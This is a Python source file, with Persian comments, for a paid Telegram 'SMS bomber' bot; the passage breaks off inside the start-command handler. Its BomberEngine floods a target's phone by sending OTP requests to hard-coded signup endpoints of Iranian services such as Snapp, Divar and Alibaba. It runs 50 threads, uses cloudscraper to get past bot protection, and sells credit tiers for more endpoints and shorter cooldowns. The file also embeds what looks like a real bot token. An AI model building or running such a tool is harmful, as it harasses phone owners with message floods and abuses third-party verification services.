# bot.py - نسخه کامل هیبریدی (Local + Render)
import os
import sys
import json
import time
import asyncio
import logging
import threading
import random
import signal
import smtplib
from email.mime.text import MIMEText
from datetime import datetime
from typing import Dict, List, Optional, Any
from typing import Dict, List, Optional, Any, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed

# ===== ایمپورت‌های جدید برای Webhook =====
from flask import Flask, request, jsonify

# ===== ایمپورت‌های aiogram =====
try:
    from aiogram import Bot, Dispatcher, types, F
    from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, Update
    from aiogram.filters import Command, CommandStart
    from aiogram.fsm.context import FSMContext
    from aiogram.fsm.state import State, StatesGroup
    from aiogram.fsm.storage.memory import MemoryStorage
    from aiogram.client.session.aiohttp import AiohttpSession
    from aiogram.utils.keyboard import InlineKeyboardBuilder
except ImportError as e:
    print(f"❌ خطا در وارد کردن ماژول‌های aiogram: {e}")
    sys.exit(1)

# ===== ایمپورت‌های دیگر =====
try:
    import cloudscraper
    from colorama import Fore, init, Style
    init(autoreset=True)
except ImportError as e:
    print(f"❌ خطا در وارد کردن ماژول‌ها: {e}")
    print("لطفاً پیش‌نیازها را نصب کنید:")
    print("pip install aiogram==3.1.1 aiosqlite cloudscraper colorama flask")
    sys.exit(1)

# ============================================================
# تنظیمات (Config)
# ============================================================

BOT_TOKEN = os.environ.get("BOT_TOKEN", "8586016384:AAFNSMHw-2TsJGZBcHKNOHrOzOa_HliZC9E")
ADMIN_IDS = [int(id) for id in os.environ.get("ADMIN_IDS", "7351574618").split(",")]
PORT = int(os.environ.get("PORT", 8080))

# تنظیمات سطوح کاربری
TIER_LIMITS = {
    'Free': 30,
    'VIP': 80,
    'Pro': 9999
}

TIER_COOLDOWNS = {
    'Free': 300,
    'VIP': 180,
    'Pro': 60
}

# بسته‌های اعتبار
CREDIT_PACKAGES = {
    'small': {'amount': 50, 'price': 20000, 'label': '۵۰ بمب - ۲۰,۰۰۰ تومان'},
    'medium': {'amount': 150, 'price': 50000, 'label': '۱۵۰ بمب - ۵۰,۰۰۰ تومان'},
    'large': {'amount': 500, 'price': 150000, 'label': '۵۰۰ بمب - ۱۵۰,۰۰۰ تومان'}
}

DB_PATH = "data/users.db"

# ============================================================
# Flask App
# ============================================================

app = Flask(__name__)

# ============================================================
# State های FSM
# ============================================================

class BombState(StatesGroup):
    waiting_for_phone = State()

class EmailState(StatesGroup):
    waiting_for_info = State()

class AdminState(StatesGroup):
    waiting_for_broadcast = State()
    waiting_for_credits = State()
    waiting_for_user_id = State()
    waiting_for_endpoint_name = State()
    waiting_for_endpoint_data = State()

class PaymentState(StatesGroup):
    waiting_for_screenshot = State()

# ============================================================
# مقداردهی اولیه Bot و Dispatcher
# ============================================================

# تنظیم پروکسی (در صورت نیاز)
PROXY_URL = os.environ.get("PROXY_URL", None)

if PROXY_URL:
    session = AiohttpSession(proxy=PROXY_URL)
    bot = Bot(token=BOT_TOKEN, session=session)
else:
    bot = Bot(token=BOT_TOKEN)

storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# ============================================================
# دیتابیس (Database)
# ============================================================

import aiosqlite
import sqlite3
import random
import string

class Database:
    def __init__(self):
        self._init_db()
    
    def _init_db(self):
        os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
        
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                tier TEXT DEFAULT 'Free',
                credits INTEGER DEFAULT 0,
                referral_count INTEGER DEFAULT 0,
                referral_code TEXT UNIQUE,
                referred_by INTEGER,
                last_bomb_time TIMESTAMP,
                registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_admin INTEGER DEFAULT 0,
                is_banned INTEGER DEFAULT 0,
                total_bombs_sent INTEGER DEFAULT 0
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS credit_transactions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                amount INTEGER,
                type TEXT,
                description TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS payment_requests (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                amount INTEGER,
                package TEXT,
                screenshot_path TEXT,
                status TEXT DEFAULT 'pending',
                admin_note TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                processed_at TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS referrals (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                referrer_id INTEGER,
                referred_id INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                is_successful INTEGER DEFAULT 1
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS bomb_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                target_phone TEXT,
                endpoints_used INTEGER,
                success_count INTEGER,
                failed_count INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS disabled_endpoints (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                endpoint_name TEXT,
                disabled_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                reason TEXT
            )
        """)
        
        conn.commit()
        conn.close()
    
    async def get_user(self, user_id: int) -> Optional[Dict]:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
            row = await cursor.fetchone()
            return dict(row) if row else None
    
    async def get_user_by_referral_code(self, referral_code: str) -> Optional[Dict]:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute("SELECT * FROM users WHERE referral_code = ?", (referral_code,))
            row = await cursor.fetchone()
            return dict(row) if row else None
    
    async def create_user(self, user_id: int, username: str = None,
                         first_name: str = None, last_name: str = None,
                         referred_by: int = None) -> Dict:
        referral_code = self._generate_referral_code()
        
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                """INSERT INTO users 
                   (user_id, username, first_name, last_name, referral_code, referred_by)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (user_id, username, first_name, last_name, referral_code, referred_by)
            )
            await db.commit()
            
            if referred_by:
                await self._increment_referral_count(referred_by, user_id)
            
            await self.add_credits(user_id, 5, "اعتبار خوش‌آمدگویی")
            
            return await self.get_user(user_id)
    
    def _generate_referral_code(self) -> str:
        chars = string.ascii_uppercase + string.digits
        return ''.join(random.choices(chars, k=6))
    
    async def _increment_referral_count(self, referrer_id: int, referred_id: int):
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                "INSERT INTO referrals (referrer_id, referred_id) VALUES (?, ?)",
                (referrer_id, referred_id)
            )
            
            await db.execute(
                "UPDATE users SET referral_count = referral_count + 1 WHERE user_id = ?",
                (referrer_id,)
            )
            await db.commit()
            
            cursor = await db.execute(
                "SELECT referral_count, tier FROM users WHERE user_id = ?",
                (referrer_id,)
            )
            row = await cursor.fetchone()
            
            if row and row[0] >= 3 and row[1] == 'Free':
                await db.execute("UPDATE users SET tier = 'VIP' WHERE user_id = ?", (referrer_id,))
                await db.commit()
                return True
        return False
    
    async def get_user_tier(self, user_id: int) -> str:
        user = await self.get_user(user_id)
        return user.get('tier', 'Free') if user else 'Free'
    
    async def get_available_endpoints_count(self, user_id: int) -> int:
        tier = await self.get_user_tier(user_id)
        return TIER_LIMITS.get(tier, 30)
    
    async def get_cooldown(self, user_id: int) -> int:
        tier = await self.get_user_tier(user_id)
        return TIER_COOLDOWNS.get(tier, 300)
    
    async def check_cooldown(self, user_id: int) -> tuple:
        user = await self.get_user(user_id)
        if not user:
            return False, 0, "❌ کاربر یافت نشد!"
        
        if user.get('is_banned', 0) == 1:
            return False, 0, "🚫 شما مسدود شده‌اید!"
        
        last_time = user.get('last_bomb_time')
        if not last_time:
            return True, 0, "✅ آماده ارسال!"
        
        last_bomb = datetime.fromisoformat(last_time)
        cooldown = await self.get_cooldown(user_id)
        elapsed = (datetime.now() - last_bomb).total_seconds()
        remaining = cooldown - elapsed
        
        if remaining > 0:
            minutes = int(remaining // 60)
            seconds = int(remaining % 60)
            return False, remaining, f"⏳ باید {minutes:02d}:{seconds:02d} صبر کنید!"
        
        return True, 0, "✅ آماده ارسال!"
    
    async def update_last_bomb_time(self, user_id: int):
        now = datetime.now().isoformat()
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE users SET last_bomb_time = ? WHERE user_id = ?", (now, user_id))
            await db.commit()
    
    async def get_credits(self, user_id: int) -> int:
        user = await self.get_user(user_id)
        return user.get('credits', 0) if user else 0
    
    async def add_credits(self, user_id: int, amount: int, description: str = ""):
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
            await db.execute(
                """INSERT INTO credit_transactions (user_id, amount, type, description) 
                   VALUES (?, ?, 'add', ?)""",
                (user_id, amount, description)
            )
            await db.commit()
    
    async def spend_credit(self, user_id: int, amount: int = 1) -> bool:
        credits = await self.get_credits(user_id)
        if credits < amount:
            return False
        
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE users SET credits = credits - ? WHERE user_id = ?", (amount, user_id))
            await db.execute(
                """INSERT INTO credit_transactions (user_id, amount, type, description) 
                   VALUES (?, ?, 'spend', ?)""",
                (user_id, amount, "استفاده از بمب (۱ اعتبار)")
            )
            await db.execute("UPDATE users SET total_bombs_sent = total_bombs_sent + 1 WHERE user_id = ?", (user_id,))
            await db.commit()
            return True
    
    async def get_credit_history(self, user_id: int, limit: int = 10) -> List[Dict]:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute(
                """SELECT * FROM credit_transactions WHERE user_id = ? 
                   ORDER BY created_at DESC LIMIT ?""",
                (user_id, limit)
            )
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]
    
    async def get_referral_count(self, user_id: int) -> int:
        user = await self.get_user(user_id)
        return user.get('referral_count', 0) if user else 0
    
    async def get_referral_link(self, user_id: int) -> str:
        user = await self.get_user(user_id)
        if not user:
            return ""
        code = user.get('referral_code', '')
        return f"https://t.me/SMSBOMBER_free1_bot?start=ref_{code}"
    
    async def get_referral_list(self, user_id: int) -> List[Dict]:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute(
                """SELECT u.user_id, u.username, u.first_name, u.registered_at
                   FROM referrals r JOIN users u ON r.referred_id = u.user_id
                   WHERE r.referrer_id = ? ORDER BY r.created_at DESC""",
                (user_id,)
            )
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]
    
    async def add_payment_request(self, user_id: int, package: str, amount: int, screenshot_path: str) -> int:
        async with aiosqlite.connect(DB_PATH) as db:
            cursor = await db.execute(
                """INSERT INTO payment_requests (user_id, package, amount, screenshot_path) 
                   VALUES (?, ?, ?, ?)""",
                (user_id, package, amount, screenshot_path)
            )
            await db.commit()
            return cursor.lastrowid
    
    async def get_pending_payments(self) -> List[Dict]:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute(
                """SELECT pr.*, u.username, u.first_name, u.last_name 
                   FROM payment_requests pr JOIN users u ON pr.user_id = u.user_id
                   WHERE pr.status = 'pending' ORDER BY pr.created_at DESC"""
            )
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]
    
    async def get_payment_request(self, request_id: int) -> Optional[Dict]:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute("SELECT * FROM payment_requests WHERE id = ?", (request_id,))
            row = await cursor.fetchone()
            return dict(row) if row else None
    
    async def approve_payment(self, request_id: int, admin_note: str = "") -> bool:
        async with aiosqlite.connect(DB_PATH) as db:
            cursor = await db.execute("SELECT user_id, amount FROM payment_requests WHERE id = ?", (request_id,))
            row = await cursor.fetchone()
            if not row:
                return False
            
            user_id, amount = row
            
            await db.execute(
                """UPDATE payment_requests SET status = 'approved', admin_note = ?, processed_at = CURRENT_TIMESTAMP 
                   WHERE id = ?""",
                (admin_note, request_id)
            )
            
            await db.execute("UPDATE users SET credits = credits + ? WHERE user_id = ?", (amount, user_id))
            await db.execute(
                """INSERT INTO credit_transactions (user_id, amount, type, description) 
                   VALUES (?, ?, 'add', ?)""",
                (user_id, amount, f"پرداخت تأیید شده - درخواست #{request_id}")
            )
            await db.commit()
            return True
    
    async def reject_payment(self, request_id: int, admin_note: str = "") -> bool:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                """UPDATE payment_requests SET status = 'rejected', admin_note = ?, processed_at = CURRENT_TIMESTAMP 
                   WHERE id = ?""",
                (admin_note, request_id)
            )
            await db.commit()
            return True
    
    async def log_bomb(self, user_id: int, target_phone: str, endpoints_used: int, 
                       success_count: int, failed_count: int):
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                """INSERT INTO bomb_logs (user_id, target_phone, endpoints_used, success_count, failed_count) 
                   VALUES (?, ?, ?, ?, ?)""",
                (user_id, target_phone, endpoints_used, success_count, failed_count)
            )
            await db.commit()
    
    async def get_user_stats(self, user_id: int) -> Dict:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            
            cursor = await db.execute(
                "SELECT tier, credits, referral_count, total_bombs_sent FROM users WHERE user_id = ?",
                (user_id,)
            )
            user_row = await cursor.fetchone()
            
            cursor = await db.execute(
                "SELECT COUNT(*) as total, SUM(success_count) as success, SUM(failed_count) as failed FROM bomb_logs WHERE user_id = ?",
                (user_id,)
            )
            log_row = await cursor.fetchone()
            
            return {
                'tier': user_row[0] if user_row else 'Free',
                'credits': user_row[1] if user_row else 0,
                'referral_count': user_row[2] if user_row else 0,
                'total_bombs': user_row[3] if user_row else 0,
                'total_logs': log_row[0] if log_row else 0,
                'total_success': log_row[1] if log_row else 0,
                'total_failed': log_row[2] if log_row else 0
            }
    
    async def get_admin_stats(self) -> Dict:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            
            cursor = await db.execute("SELECT COUNT(*) FROM users")
            total_users = (await cursor.fetchone())[0]
            
            cursor = await db.execute("SELECT COUNT(*) FROM users WHERE tier = 'Free'")
            free_users = (await cursor.fetchone())[0]
            
            cursor = await db.execute("SELECT COUNT(*) FROM users WHERE tier = 'VIP'")
            vip_users = (await cursor.fetchone())[0]
            
            cursor = await db.execute("SELECT COUNT(*) FROM users WHERE tier = 'Pro'")
            pro_users = (await cursor.fetchone())[0]
            
            cursor = await db.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
            banned_users = (await cursor.fetchone())[0]
            
            cursor = await db.execute("SELECT COUNT(*) FROM payment_requests WHERE status = 'pending'")
            pending_payments = (await cursor.fetchone())[0]
            
            cursor = await db.execute("SELECT COUNT(*) FROM bomb_logs")
            total_bombs = (await cursor.fetchone())[0]
            
            cursor = await db.execute("SELECT SUM(credits) FROM users")
            total_credits = (await cursor.fetchone())[0] or 0
            
            return {
                'total_users': total_users,
                'free_users': free_users,
                'vip_users': vip_users,
                'pro_users': pro_users,
                'banned_users': banned_users,
                'pending_payments': pending_payments,
                'total_bombs': total_bombs,
                'total_credits': total_credits
            }
    
    async def get_bomb_history(self, user_id: int, limit: int = 10) -> List[Dict]:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute(
                """SELECT * FROM bomb_logs WHERE user_id = ? ORDER BY created_at DESC LIMIT ?""",
                (user_id, limit)
            )
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]
    
    async def disable_endpoint(self, endpoint_name: str, reason: str = "خطا در ارسال"):
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute(
                """INSERT INTO disabled_endpoints (endpoint_name, reason) VALUES (?, ?)""",
                (endpoint_name, reason)
            )
            await db.commit()
    
    async def get_disabled_endpoints(self) -> List[str]:
        async with aiosqlite.connect(DB_PATH) as db:
            cursor = await db.execute("SELECT endpoint_name FROM disabled_endpoints")
            rows = await cursor.fetchall()
            return [row[0] for row in rows]
    
    async def enable_endpoint(self, endpoint_name: str):
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("DELETE FROM disabled_endpoints WHERE endpoint_name = ?", (endpoint_name,))
            await db.commit()
    
    async def get_all_users(self, offset: int = 0, limit: int = 50) -> List[Dict]:
        async with aiosqlite.connect(DB_PATH) as db:
            db.row_factory = aiosqlite.Row
            cursor = await db.execute(
                """SELECT user_id, username, first_name, last_name, tier, credits, 
                          referral_count, registered_at, is_banned 
                   FROM users ORDER BY registered_at DESC LIMIT ? OFFSET ?""",
                (limit, offset)
            )
            rows = await cursor.fetchall()
            return [dict(row) for row in rows]
    
    async def ban_user(self, user_id: int) -> bool:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE users SET is_banned = 1 WHERE user_id = ?", (user_id,))
            await db.commit()
            return True
    
    async def unban_user(self, user_id: int) -> bool:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE users SET is_banned = 0 WHERE user_id = ?", (user_id,))
            await db.commit()
            return True
    
    async def set_admin(self, user_id: int) -> bool:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE users SET is_admin = 1 WHERE user_id = ?", (user_id,))
            await db.commit()
            return True
    
    async def remove_admin(self, user_id: int) -> bool:
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("UPDATE users SET is_admin = 0 WHERE user_id = ?", (user_id,))
            await db.commit()
            return True
    
    async def is_admin(self, user_id: int) -> bool:
        user = await self.get_user(user_id)
        return user.get('is_admin', 0) == 1 if user else False
    
    async def is_banned(self, user_id: int) -> bool:
        user = await self.get_user(user_id)
        return user.get('is_banned', 0) == 1 if user else False

db = Database()

# ============================================================
# Endpoint Manager
# ============================================================

ENDPOINTS_FILE = "endpoints.json"

class EndpointManager:
    def __init__(self):
        self.endpoints = []
        self.disabled_endpoints = []
        self.load_endpoints()
    
    def load_endpoints(self):
        try:
            with open(ENDPOINTS_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
            if isinstance(data, list):
                self.endpoints = data
                self.endpoints = [e for e in self.endpoints if isinstance(e, dict) and e.get('active', True)]
            else:
                print("⚠️ فایل endpoints.json معتبر نیست!")
                self.endpoints = []
        except FileNotFoundError:
            print("⚠️ فایل endpoints.json پیدا نشد!")
            self.create_default_endpoints()
        except json.JSONDecodeError:
            print("⚠️ فایل endpoints.json خراب است!")
            self.create_default_endpoints()
    
    def create_default_endpoints(self):
        self.endpoints = [
            {"name": "Snapp Drivers", "url": "https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"cellphone": "{phone}"}, "type": "json", "active": True},
            {"name": "Tapsi", "url": "https://tap33.me/api/v2/user", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"credential": {"phoneNumber": "0{phone}", "role": "PASSENGER"}}, "type": "json", "active": True},
            {"name": "Divar", "url": "https://api.divar.ir/v5/auth/authenticate", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phone": "0{phone}"}, "type": "json", "active": True},
            {"name": "Alibaba", "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"phoneNumber": "0{phone}"}, "type": "json", "active": True},
            {"name": "Sheypoor", "url": "https://www.sheypoor.com/api/v10.0.0/auth/send", "method": "POST", "headers": {"Content-Type": "application/json"}, "payload": {"username": "0{phone}"}, "type": "json", "active": True}
        ]
        self.save_endpoints()
        print("✅ فایل endpoints.json با اندپوینت‌های پیش‌فرض ایجاد شد!")
    
    def get_endpoints_for_tier(self, tier: str) -> List[Dict]:
        limits = {'Free': 30, 'VIP': 80, 'Pro': 9999}
        limit = limits.get(tier, 30)
        active_endpoints = [e for e in self.endpoints if e.get('active', True)]
        
        if len(active_endpoints) <= limit:
            return active_endpoints.copy()
        return random.sample(active_endpoints, limit)
    
    def get_endpoints_count(self) -> int:
        return len(self.endpoints)
    
    def get_active_count(self) -> int:
        return len([e for e in self.endpoints if e.get('active', True)])
    
    def get_all_endpoints(self) -> List[Dict]:
        return self.endpoints.copy()
    
    def mark_inactive(self, endpoint_name: str, reason: str = "خطا در ارسال"):
        for endpoint in self.endpoints:
            if endpoint.get('name') == endpoint_name:
                endpoint['active'] = False
                endpoint['disabled_reason'] = reason
                endpoint['disabled_at'] = str(datetime.now())
                self.save_endpoints()
                return True
        return False
    
    def save_endpoints(self):
        with open(ENDPOINTS_FILE, 'w', encoding='utf-8') as f:
            json.dump(self.endpoints, f, ensure_ascii=False, indent=2)
    
    def add_endpoint(self, endpoint: Dict) -> bool:
        for e in self.endpoints:
            if e.get('name') == endpoint.get('name'):
                return False
        self.endpoints.append(endpoint)
        self.save_endpoints()
        return True
    
    def remove_endpoint(self, endpoint_name: str) -> bool:
        for i, e in enumerate(self.endpoints):
            if e.get('name') == endpoint_name:
                del self.endpoints[i]
                self.save_endpoints()
                return True
        return False

endpoint_manager = EndpointManager()

# ============================================================
# Bomber Engine
# ============================================================

class BomberEngine:
    def __init__(self):
        self.scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
        )
        self.is_running = False
        self.results = []
        self.target_phone = ""
        self.max_workers = 50
    
    def _replace_phone(self, obj, phone: str):
        if isinstance(obj, str):
            return obj.replace("{phone}", phone)
        elif isinstance(obj, dict):
            return {k: self._replace_phone(v, phone) for k, v in obj.items()}
        elif isinstance(obj, list):
            return [self._replace_phone(i, phone) for i in obj]
        return obj
    
    def attack_site(self, site: Dict, phone: str, test_type: str = "without_zero") -> Dict:
        result = {
            'name': site.get('name', 'Unknown'),
            'url': site.get('url', ''),
            'phone': phone,
            'test_type': test_type,
            'status': 'unknown',
            'status_code': None,
            'error': None,
            'message': None,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            headers = site.get('headers', {}).copy()
            
            if test_type == "with_zero":
                test_phone = "0" + phone
            else:
                test_phone = phone if not phone.startswith('0') else phone[1:]
            
            payload = self._replace_phone(site.get('payload', {}), test_phone)
            url = site['url'].replace("{phone}", test_phone)
            
            if site.get('method') == 'GET':
                response = self.scraper.get(url, params=payload, headers=headers, timeout=15)
            else:
                if site.get('type') == 'form':
                    response = self.scraper.post(url, data=payload, headers=headers, timeout=15)
                else:
                    response = self.scraper.post(url, json=payload, headers=headers, timeout=15)
            
            result['status_code'] = response.status_code
            result['status'] = 'success' if response.status_code < 400 else 'failed'
            
            try:
                resp_json = response.json()
                if resp_json.get('success') or resp_json.get('status') == 'success' or resp_json.get('result') == 'OK':
                    result['message'] = '✅ OTP sent!'
                elif resp_json.get('message'):
                    result['message'] = f"📩 {resp_json.get('message')}"
                else:
                    result['message'] = f'Response: {response.text[:80]}'
            except:
                text = response.text.lower()
                if 'success' in text or 'ok' in text or 'otp' in text:
                    result['message'] = '✅ Request sent!'
                elif 'already' in text or 'exist' in text:
                    result['message'] = '⚠️ Already registered'
                else:
                    result['message'] = f'Response: {response.text[:80]}'
            
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        
        return result
    
    def run_bomb(self, endpoints: List[Dict], phone: str, callback: Callable = None, 
                 mode: str = "storm", on_complete: Callable = None) -> Dict:
        self.is_running = True
        self.results = []
        self.target_phone = phone
        
        variations = ["without_zero", "with_zero"]
        variation_names = ["بدون صفر", "با صفر"]
        
        total_endpoints = len(endpoints) * len(variations)
        processed = 0
        
        try:
            for var_idx, var_type in enumerate(variations):
                if not self.is_running:
                    break
                
                if callback:
                    callback("progress", f"📱 تست: {variation_names[var_idx]}")
                
                if mode == "storm":
                    with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                        future_to_site = {
                            executor.submit(self.attack_site, site, phone, var_type): site
                            for site in endpoints
                        }
                        
                        for future in as_completed(future_to_site):
                            if not self.is_running:
                                break
                            result = future.result()
                            self.results.append(result)
                            processed += 1
                            if callback:
                                callback("result", result)
                                callback("progress", f"پیشرفت: {processed}/{total_endpoints}")
                else:
                    for site in endpoints:
                        if not self.is_running:
                            break
                        result = self.attack_site(site, phone, var_type)
                        self.results.append(result)
                        processed += 1
                        if callback:
                            callback("result", result)
                            callback("progress", f"پیشرفت: {processed}/{total_endpoints}")
                        time.sleep(0.5)
                
                if callback:
                    callback("round_complete", f"✅ {variation_names[var_idx]} کامل شد")
        
        except Exception as e:
            if callback:
                callback("error", f"❌ خطا در حین اجرا: {e}")
        
        finally:
            self.is_running = False
            
            success = [r for r in self.results if r['status'] == 'success']
            failed = [r for r in self.results if r['status'] == 'failed']
            errors = [r for r in self.results if r['status'] == 'error']
            
            result = {
                'total': len(self.results),
                'success': len(success),
                'failed': len(failed),
                'errors': len(errors),
                'results': self.results,
                'target_phone': phone
            }
            
            if on_complete:
                on_complete(result)
            
            return result
    
    def stop(self):
        self.is_running = False

bomber_engine = BomberEngine()

# ============================================================
# Admin Panel
# ============================================================

class AdminPanel:
    @staticmethod
    async def is_admin(user_id: int) -> bool:
        return user_id in ADMIN_IDS or await db.is_admin(user_id)
    
    @staticmethod
    async def show_admin_menu(user_id: int) -> InlineKeyboardMarkup:
        keyboard = [
            [InlineKeyboardButton(text="📋 درخواست‌های پرداخت", callback_data="admin_payments")],
            [InlineKeyboardButton(text="👥 مدیریت کاربران", callback_data="admin_users")],
            [InlineKeyboardButton(text="📊 آمار کلی", callback_data="admin_stats")],
            [InlineKeyboardButton(text="📢 ارسال پیام همگانی", callback_data="admin_broadcast")],
            [InlineKeyboardButton(text="📁 مدیریت اندپوینت‌ها", callback_data="admin_endpoints")],
            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="back_to_menu")]
        ]
        return InlineKeyboardMarkup(inline_keyboard=keyboard)
    
    @staticmethod
    async def build_payment_keyboard(payment_id: int) -> InlineKeyboardMarkup:
        keyboard = [
            [InlineKeyboardButton(text="✅ تأیید", callback_data=f"approve_payment_{payment_id}"),
             InlineKeyboardButton(text="❌ رد", callback_data=f"reject_payment_{payment_id}")],
            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_payments")]
        ]
        return InlineKeyboardMarkup(inline_keyboard=keyboard)
    
    @staticmethod
    async def build_user_keyboard(user_id: int) -> InlineKeyboardMarkup:
        user = await db.get_user(user_id)
        if not user:
            return InlineKeyboardMarkup(inline_keyboard=[])
        
        is_banned = user.get('is_banned', 0) == 1
        ban_text = "🚫 بن کردن" if not is_banned else "✅ رفع بن"
        ban_callback = f"ban_user_{user_id}" if not is_banned else f"unban_user_{user_id}"
        
        keyboard = [
            [InlineKeyboardButton(text="💰 تنظیم اعتبار", callback_data=f"set_credits_{user_id}")],
            [InlineKeyboardButton(text=ban_text, callback_data=ban_callback)],
            [InlineKeyboardButton(text="📊 مشاهده آمار", callback_data=f"user_stats_{user_id}")],
            [InlineKeyboardButton(text="🔙 بازگشت", callback_data="admin_users")]
        ]
        return InlineKeyboardMarkup(inline_keyboard=keyboard)

# ============================================================
# Utils
# ============================================================

def is_valid_phone(phone: str) -> bool:
    import re
    phone = phone.replace(" ", "").replace("-", "").replace("_", "")
    patterns = [
        r"^09[0-9]{9}$",
        r"^9[0-9]{9}$",
        r"^\+989[0-9]{9}$",
        r"^00989[0-9]{9}$",
    ]
    for pattern in patterns:
        if re.match(pattern, phone):
            return True
    return False

def format_time(seconds: int) -> str:
    if seconds <= 0:
        return "۰۰:۰۰"
    minutes = int(seconds // 60)
    secs = int(seconds % 60)
    return f"{minutes:02d}:{secs:02d}"

# ============================================================
# کیبوردهای اصلی
# ============================================================

async def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton(text="📱 SMS Bomber", callback_data="sms_bomb")],
        [InlineKeyboardButton(text="👤 پروفایل", callback_data="profile")],
        [InlineKeyboardButton(text="🔗 سیستم معرفی", callback_data="referral")],
        [InlineKeyboardButton(text="💰 خرید اعتبار", callback_data="buy_credits")],
        [InlineKeyboardButton(text="📊 آمار", callback_data="stats")]
    ]
    
    if await AdminPanel.is_admin(user_id):
        keyboard.append([InlineKeyboardButton(text="⚙️ پنل مدیریت", callback_data="admin_panel")])
    
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

# ============================================================
# دستورات اصلی
# ============================================================

@dp.message(CommandStart())
async def cmd_start(message: Message):
    user_id = message.from_user.id
    username = message.from_user.username
    first_name = message.from_user.first_name
    last_name = message.from_user.last_name
    
    user = await db.get_user(user_id)
    
    args = message.text.split()
    referred_by = None
    if len(args) > 1 and args[1].startswith('ref_'):
        referral_code = args[1][4:]
        referrer = await db.get_user_by_referral_code(referral_code)
        if referrer and referrer['user_id'] != user_id:
            referred_by = referrer['user_id']
    
    if not user:
        user = await db.create_user(user_id, username, first_name, last_name, referred_by)
        await message.answer(
            f"👋 **خوش آمدید {first_name}!**\n\n"
            f"🎁 **۵ اعتبار** رایگان به حساب شما اضافه شد!\n\n"
            f"📊 سطح: {user['tier']}\n"
            f"💰 اعتبار: {user['credits']}\n\n"
            f"از منوی زیر استفاده کنید:",
            reply_markup=await get_main_keyboard(user_id)
        )
    else:
        if user.get('is_banned', 0) == 1:
            await message.answer("🚫 شما توسط ادمین مسدود شده‌اید!")
            return
        
        await message.answer(
            f"👋 **خوش برگشتی {first_name}!**\n\n"
